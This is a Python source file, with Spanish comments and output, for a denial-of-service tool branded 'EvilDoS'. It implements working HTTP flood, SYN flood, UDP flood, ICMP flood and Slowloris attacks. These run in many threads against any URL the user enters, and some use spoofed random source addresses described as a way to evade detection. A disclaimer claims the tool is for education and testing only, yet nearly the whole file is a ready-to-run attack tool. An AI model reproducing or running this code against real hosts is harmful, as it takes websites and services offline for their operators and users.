import socket
import threading
import requests
import time
import sys
import urllib.parse
import random
import platform

# Colores para terminal
class Colors:
    RED = '\033[91m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    DARK_GRAY = '\033[38;5;240m'
    LIGHT_RED = '\033[38;5;203m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    GREEN = '\033[5;32m'

def print_banner():
    """Imprime un banner ASCII atractivo para EvilDoS"""
    is_windows = platform.system().lower() == "windows"
    
    # En Windows, intentamos habilitar el soporte de color ANSI
    if is_windows:
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except:
            pass
    
    banner = f"""
{Colors.RED}{Colors.BOLD}▓█████{Colors.WHITE}▒█████{Colors.RED}  ▒█████  {Colors.GRAY}▒█████   {Colors.WHITE}█    ██{Colors.RESET}  
{Colors.RED}▓█   ▀{Colors.WHITE}▒██▒  ██▒{Colors.RED}▒██▒  ██▒{Colors.GRAY}▒██▒  ██▒{Colors.WHITE} ██  ▓██▒{Colors.RESET} 
{Colors.RED}▒███{Colors.WHITE}  ▒██░  ██▒{Colors.RED}▒██░  ██▒{Colors.GRAY}▒██░  ██▒{Colors.WHITE}▓██  ▒██░{Colors.RESET} 
{Colors.RED}▒▓█  ▄{Colors.WHITE}▒██   ██░{Colors.RED}▒██   ██░{Colors.GRAY}▒██   ██░{Colors.WHITE}▓▓█  ░██░{Colors.RESET} 
{Colors.RED}░▒████▒{Colors.WHITE}░ ████▓▒░{Colors.RED}░ ████▓▒░{Colors.GRAY}░ ████▓▒░{Colors.WHITE}▒▒█████▓ {Colors.RESET} 
{Colors.RED}░░ ▒░ ░{Colors.WHITE}░ ▒░▒░▒░ {Colors.RED}░ ▒░▒░▒░ {Colors.GRAY}░ ▒░▒░▒░ {Colors.WHITE}░▒▓▒ ▒ ▒ {Colors.RESET} 
{Colors.RED} ░ ░  ░{Colors.WHITE}  ░ ▒ ▒░ {Colors.RED}  ░ ▒ ▒░ {Colors.GRAY}  ░ ▒ ▒░ {Colors.WHITE}░░▒░ ░ ░ {Colors.RESET} 
{Colors.RED}   ░   {Colors.WHITE}░ ░ ░ ▒  {Colors.RED}░ ░ ░ ▒  {Colors.GRAY}░ ░ ░ ▒  {Colors.WHITE} ░░░ ░ ░ {Colors.RESET} 
{Colors.RED}   ░  ░{Colors.WHITE}    ░ ░  {Colors.RED}    ░ ░  {Colors.GRAY}    ░ ░  {Colors.WHITE}   ░     {Colors.RESET} 
    {Colors.GRAY}======================================================{Colors.RESET}
    {Colors.RED}{Colors.BOLD}[!] {Colors.LIGHT_RED}Herramienta Avanzada de Denegación de Servicio{Colors.RESET}
    {Colors.GRAY}[*] {Colors.DARK_GRAY}Creada Solo con Fines Educativos y de Prueba{Colors.RESET}
    {Colors.GRAY}[*] {Colors.DARK_GRAY}Úsala bajo tu propia responsabilidad{Colors.RESET}
    {Colors.GRAY}[*] {Colors.DARK_GRAY}DoS HTTP v1.0 {Colors.RESET}
    {Colors.GRAY}======================================================{Colors.RESET}
"""
    print(banner)

def animate_loading(seconds=3, text="Iniciando"):
    """Anima un indicador de carga"""
    animation = "|/-\\"
    idx = 0
    end_time = time.time() + seconds
    
    while time.time() < end_time:
        sys.stdout.write(f"\r{Colors.GRAY}{text} {animation[idx % len(animation)]}{Colors.RESET}")
        sys.stdout.flush()
        idx += 1
        time.sleep(0.1)
    
    sys.stdout.write(f"\r{Colors.GREEN}✓ {text} completado!{Colors.RESET}\n")

def http_flood(target, port):
    """Realiza un ataque HTTP Flood enviando muchas solicitudes al servidor."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.62"
    ]
    
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            requests.get(f"http://{target}:{port}", headers=headers, timeout=5)
            print(f"{Colors.RED}[+] HTTP Flood enviado{Colors.RESET}")
        except requests.exceptions.RequestException:
            print(f"{Colors.GRAY}[-] Error en HTTP Flood{Colors.RESET}")
            time.sleep(2)

def syn_flood(target, port):
    """Realiza un ataque SYN Flood enviando paquetes TCP SYN sin completar la conexión."""
    try:
        from scapy.all import IP, TCP, send, RandShort
    except ImportError:
        print(f"{Colors.RED}[-] Error: Scapy no está instalado. Instálalo con 'pip install scapy'{Colors.RESET}")
        sys.exit(1)
        
    while True:
        try:
            # Usar IP y puertos de origen aleatorios para evadir detección
            packet = IP(dst=target, src=f"192.168.{random.randint(1,254)}.{random.randint(1,254)}") / \
                    TCP(sport=RandShort(), dport=port, flags="S")
            send(packet, verbose=False)
            print(f"{Colors.RED}[+] SYN Flood enviado{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.GRAY}[-] Error en SYN Flood: {e}{Colors.RESET}")
            time.sleep(2)

def udp_flood(target, port):
    """Realiza un ataque UDP Flood enviando paquetes a un puerto específico."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Crear datos aleatorios de diferentes tamaños para evitar patrones
    sizes = [64, 128, 256, 512, 1024, 2048]
    
    while True:
        try:
            size = random.choice(sizes)
            data = random._urandom(size)  # Datos aleatorios
            sock.sendto(data, (target, port))
            print(f"{Colors.RED}[+] UDP Flood enviado ({size} bytes){Colors.RESET}")
        except Exception as e:
            print(f"{Colors.GRAY}[-] Error en UDP Flood: {e}{Colors.RESET}")
            time.sleep(2)

def ping_flood(target, port):
    """Realiza un Ping Flood enviando múltiples paquetes ICMP."""
    try:
        from scapy.all import IP, ICMP, send, Raw
    except ImportError:
        print(f"{Colors.RED}[-] Error: Scapy no está instalado. Instálalo con 'pip install scapy'{Colors.RESET}")
        sys.exit(1)
        
    while True:
        try:
            # Crear paquetes ICMP con datos aleatorios y IP de origen aleatorio
            size = random.randint(64, 1024)
            packet = IP(dst=target, src=f"192.168.{random.randint(1,254)}.{random.randint(1,254)}") / \
                    ICMP() / Raw(load=random._urandom(size))
            send(packet, verbose=False)
            print(f"{Colors.RED}[+] Ping Flood enviado ({size} bytes){Colors.RESET}")
        except Exception as e:
            print(f"{Colors.GRAY}[-] Error en Ping Flood: {e}{Colors.RESET}")
            time.sleep(2)

def slowloris(target, port):
    """Realiza un ataque Slowloris manteniendo conexiones abiertas al servidor."""
    sockets = []
    THREADS = 150  # Número de conexiones a mantener
    
    # Lista de headers para enviar lentamente
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept-language: en-US,en,q=0.5",
        "Connection: keep-alive",
        "Keep-Alive: 300",
        "Content-Length: 42",
        "Cache-Control: max-age=0",
        "X-a: b",
        "X-b: c",
        "X-c: d"
    ]
    
    for _ in range(THREADS):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            sockets.append(s)
            print(f"{Colors.RED}[+] Socket {len(sockets)} conectado{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.GRAY}[-] Error creando socket: {e}{Colors.RESET}")
    
    print(f"{Colors.WHITE}[+] {len(sockets)} sockets creados{Colors.RESET}")
    
    while True:
        for i, s in enumerate(sockets):
            try:
                header = random.choice(headers)
                s.send(f"{header}\r\n".encode())
                print(f"{Colors.RED}[+] Slowloris - Manteniendo socket {i+1}{Colors.RESET}")
            except:
                sockets.remove(s)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {target}\r\n".encode())
                    sockets.append(s)
                    print(f"{Colors.GRAY}[+] Reconectado socket {i+1}{Colors.RESET}")
                except:
                    pass
        
        print(f"{Colors.WHITE}[+] Slowloris ataque en progreso: {len(sockets)} sockets activos{Colors.RESET}")
        time.sleep(15)  # Enviar headers más lentamente para un mejor efecto

def parse_url(url):
    """Parsea una URL y devuelve el host y el puerto."""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    parsed = urllib.parse.urlparse(url)
    hostname = parsed.netloc
    
    # Separar el host y el puerto
    if ':' in hostname:
        hostname, port_str = hostname.split(':')
        port = int(port_str)
    else:
        port = 80 if parsed.scheme == 'http' else 443
    
    return hostname, port

def show_target_info(target, port):
    """Muestra información del objetivo si es posible"""
    print(f"{Colors.WHITE}[*] Objetivo seleccionado: {Colors.RED}{target}{Colors.WHITE}:{Colors.RED}{port}{Colors.RESET}")
    
    try:
        ip = socket.gethostbyname(target)
        if ip != target:
            print(f"{Colors.WHITE}[*] Resolviendo DNS: {Colors.RED}{target} {Colors.WHITE}→ {Colors.RED}{ip}{Colors.RESET}")
    except:
        print(f"{Colors.GRAY}[!] No se pudo resolver DNS para {target}{Colors.RESET}")
    
    # Intento básico de detectar el servidor web
    try:
        response = requests.head(f"http://{target}:{port}", timeout=3)
        if 'Server' in response.headers:
            print(f"{Colors.WHITE}[*] Servidor detectado: {Colors.RED}{response.headers['Server']}{Colors.RESET}")
    except:
        print(f"{Colors.GRAY}[!] No se pudo detectar el tipo de servidor{Colors.RESET}")

def main():
    try:
        # Limpiar pantalla
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Mostrar banner
        print_banner()
        
        # Solicitar la URL al usuario
        url = input(f"{Colors.WHITE}[>] Ingresa la URL del objetivo {Colors.GRAY}(ejemplo: ejemplo.com o http://ejemplo.com){Colors.WHITE}: {Colors.RESET}")
        if not url:
            print(f"{Colors.RED}[!] URL no válida{Colors.RESET}")
            return
            
        target, port = parse_url(url)
        
        # Mostrar información del objetivo
        show_target_info(target, port)
        
        # Animar carga
        animate_loading(2, "Analizando objetivo")
        
        # Menú de opciones de ataque
        print(f"\n{Colors.WHITE}[*] Selecciona el tipo de ataque:{Colors.RESET}")
        print(f"{Colors.RED}[1] {Colors.WHITE}HTTP Flood {Colors.GRAY}(Inundación de peticiones HTTP){Colors.RESET}")
        print(f"{Colors.RED}[2] {Colors.WHITE}SYN Flood {Colors.GRAY}(Inundación de paquetes SYN - requiere scapy){Colors.RESET}")
        print(f"{Colors.RED}[3] {Colors.WHITE}UDP Flood {Colors.GRAY}(Inundación de paquetes UDP){Colors.RESET}")
        print(f"{Colors.RED}[4] {Colors.WHITE}Ping Flood {Colors.GRAY}(Inundación de paquetes ICMP - requiere scapy){Colors.RESET}")
        print(f"{Colors.RED}[5] {Colors.WHITE}Slowloris {Colors.GRAY}(Agotamiento de conexiones){Colors.RESET}")
        print(f"{Colors.RED}[6] {Colors.WHITE}Salir{Colors.RESET}")
        
        opcion = input(f"\n{Colors.WHITE}[>] Opción: {Colors.RESET}")
        
        if opcion == "6":
            print(f"{Colors.GRAY}[*] Saliendo...{Colors.RESET}")
            sys.exit(0)
            
        if opcion not in ["1", "2", "3", "4", "5"]:
            print(f"{Colors.RED}[!] Opción no válida.{Colors.RESET}")
            return
        
        # Solicitar número de hilos
        try:
            num_threads = int(input(f"{Colors.WHITE}[>] Número de hilos {Colors.GRAY}(recomendado: 10-100){Colors.WHITE}: {Colors.RESET}"))
            if num_threads < 1:
                raise ValueError("Número de hilos debe ser positivo")
        except ValueError:
            num_threads = 50
            print(f"{Colors.GRAY}[!] Valor no válido, usando {num_threads} hilos por defecto{Colors.RESET}")
        
        # Mostrar advertencia
        print(f"\n{Colors.RED}{Colors.BOLD}[!] ADVERTENCIA: {Colors.RESET}{Colors.WHITE}Este programa solo debe utilizarse en entornos controlados con autorización.{Colors.RESET}")
        print(f"{Colors.WHITE}    El uso de esta herramienta contra sistemas sin permiso puede ser {Colors.RED}ILEGAL{Colors.WHITE}.{Colors.RESET}")
        confirm = input(f"{Colors.WHITE}[>] ¿Deseas continuar? (s/n): {Colors.RESET}")
        
        if confirm.lower() != "s":
            print(f"{Colors.GRAY}[*] Operación cancelada por el usuario.{Colors.RESET}")
            return
        
        # Animar preparación
        animate_loading(3, "Preparando ataque")
        
        print(f"\n{Colors.RED}{Colors.BOLD}[!] Iniciando ataque a {target}:{port} con {num_threads} hilos...{Colors.RESET}")
        
        # Ejecutar ataque en múltiples hilos
        threads = []
        for _ in range(num_threads):
            if opcion == "1":
                t = threading.Thread(target=http_flood, args=(target, port))
            elif opcion == "2":
                t = threading.Thread(target=syn_flood, args=(target, port))
            elif opcion == "3":
                t = threading.Thread(target=udp_flood, args=(target, port))
            elif opcion == "4":
                t = threading.Thread(target=ping_flood, args=(target, port))
            elif opcion == "5":
                t = threading.Thread(target=slowloris, args=(target, port))
                
            t.daemon = True
            threads.append(t)
            t.start()
            
        # Mantener el programa ejecutando
        print(f"\n{Colors.WHITE}[*] Ataque iniciado. {Colors.RED}Presiona Ctrl+C para detener.{Colors.RESET}")
        
        # Mostrar estadísticas de ataque
        start_time = time.time()
        try:
            while True:
                elapsed = int(time.time() - start_time)
                mins, secs = divmod(elapsed, 60)
                hours, mins = divmod(mins, 60)
                print(f"\r{Colors.WHITE}[*] Tiempo transcurrido: {Colors.RED}{hours:02d}:{mins:02d}:{secs:02d}{Colors.RESET}", end="")
                time.sleep(1)
        except KeyboardInterrupt:
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)
            hours, mins = divmod(mins, 60)
            print(f"\n\n{Colors.RED}[!] Ataque detenido por el usuario.{Colors.RESET}")
            print(f"{Colors.WHITE}[*] Duración total: {Colors.RED}{hours:02d}:{mins:02d}:{secs:02d}{Colors.RESET}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Operación cancelada por el usuario.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    try:
        import os
        main()
    except ImportError as e:
        print(f"Error: {e}")
        print("Instalando dependencia faltante...")
        os.system(f"pip install {str(e).split()[-1]}")
        print("Por favor, reinicia el programa.")
